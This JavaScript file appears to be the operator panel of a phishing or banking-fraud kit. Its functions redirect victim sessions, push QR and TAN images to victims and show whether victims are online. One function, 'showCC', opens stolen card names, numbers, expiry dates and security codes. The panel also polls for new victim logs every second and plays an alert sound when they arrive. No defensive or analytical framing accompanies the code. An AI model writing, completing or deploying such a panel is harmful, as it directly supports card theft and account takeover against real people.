//Panel Sound:.
//0 - Disabled / 1 - Enabled:.
var sound_notification = 1;

//Vars:.
var xhr = new XMLHttpRequest();
var previousCount = 0;
var sound = new Howl({
      src: ['sound.mp3']
  });
//

function sendAction(id, action) {
    var url = ("postman.php?update=" + action + "&id" + id);
    $.ajax({
        type: "GET",
        data: {
            "update": action,
            "id": id
        },
        success: function(res) {
            alert("Redirected!");
        }
    });
}

function deleteLog(id) {
    var url = ("postman.php");
    $.ajax({
        type: "GET",
        data: {
            "deleteLog": id
        },
        success: function(res) {
            alert("Deleted!");
        }
    });
}

function checkVal(val) {
    if (val === 'null') {
        return '';

    } else {
        return val;
    }
}

function checkState(state) {
    if (state === 'FINISH') {
        return '<span class="link-danger" style="color:red">●</span>';
    } else {
        return '<span class="blink_me" style="color:orange">●</span>';
    }
}

function checkUserStatus(date1) {
    var actTime = moment();
    var currentDate = actTime.add(-30, 'seconds').format('DD/MM/Y hh:mm:ss');
    if (date1 > currentDate) {
        return '<span class="link-danger" style="color:green">●</span>';
    } else {
        return '<span class="link-danger" style="color:red">●</span>';
    }
}

function send2Link(id, action) {
  if (action === 'QR') {
    window.open('postman.php?sendImage&idTAN=' + id, '_blank').focus();
    
  } else if (action === 'QR_ERNO') {
    window.open('postman.php?sendImage&erno&idTAN=' + id, '_blank').focus();

  }
}

function showCC(name, cnum, cexp, ckod) {
  var url = 'card.php?cname=' + name + '&cnum=' + cnum + '&exp=' + cexp + '&ckod=' + ckod;
  window.open (url, '_blank');
}

function getPrevious() {
    xhr.open("GET", "data.php?count");
    xhr.onload = function() {
      if (xhr.status === 200) {

        var response = JSON.parse(xhr.responseText);
        previousCount = response.count;

      }
    };
    xhr.send();
}

function soundNotification() {
    setInterval(function() {
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "data.php?count");

        xhr.onload = function() {
            if (xhr.status === 200) {

                var response = JSON.parse(xhr.responseText);
                var count = response.count;

                if (count > previousCount) {
                    sound.play();
                }

                previousCount = count;
            }
        };
        xhr.send();
    }, 1000);
}

$(document).ready(function () {
    if (sound_notification == 1) {
        getPrevious();
        soundNotification();
    }
})
//